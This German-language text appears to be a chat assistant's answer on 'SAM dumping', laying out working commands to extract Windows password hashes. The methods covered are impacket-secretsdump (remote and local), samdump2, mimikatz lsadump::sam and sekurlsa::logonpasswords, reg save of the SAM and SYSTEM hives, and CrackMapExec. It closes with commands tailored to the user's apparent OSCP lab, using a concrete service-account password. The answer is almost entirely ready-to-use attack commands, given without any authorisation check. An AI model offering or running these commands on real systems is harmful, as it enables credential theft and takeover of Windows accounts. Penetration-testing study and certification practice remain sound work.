Für **SAM dumping** gibt es mehrere Tools je nach Szenario:

## **1. impacket-secretsdump (BESTE für remote):**

bash

```bash
# Remote SAM dump über SMB
impacket-secretsdump 'web_svc:Diamond1'@127.0.0.1 -target-ip 127.0.0.1

# Oder mit NTLM hash
impacket-secretsdump -hashes :ntlm_hash admin@127.0.0.1
```

## **2. Local SAM files (wenn du file access hast):**

bash

```bash
# Mit impacket-secretsdump von local files
impacket-secretsdump -sam sam_file -system system_file LOCAL

# Beispiel:
impacket-secretsdump -sam /tmp/sam -system /tmp/system LOCAL
```

## **3. samdump2 (klassisch):**

bash

```bash
# Kali hat das installiert
samdump2 system_file sam_file

# Oder 
bkhive system_file bootkey.txt
samdump2 sam_file bootkey.txt
```

## **4. Via mimikatz (wenn du RCE hast):**

powershell

```powershell
# In mimikatz
lsadump::sam

# Oder 
sekurlsa::logonpasswords
```

## **5. Mit reg save (wenn admin):**

cmd

```cmd
# SAM und SYSTEM registry hives speichern
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Dann mit secretsdump
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

## **6. CrackMapExec (auch gut):**

bash

```bash
# Remote SAM dump
cme smb 127.0.0.1 -u web_svc -p 'Diamond1' --sam
```

## **Für deinen OSCP case mit port forwarding:**

bash

```bash
# Probier zuerst:
impacket-secretsdump 'web_svc:Diamond1'@127.0.0.1:445 -target-ip 127.0.0.1

# Falls das nicht funktioniert:
cme smb 127.0.0.1:445 -u web_svc -p 'Diamond1' --sam
```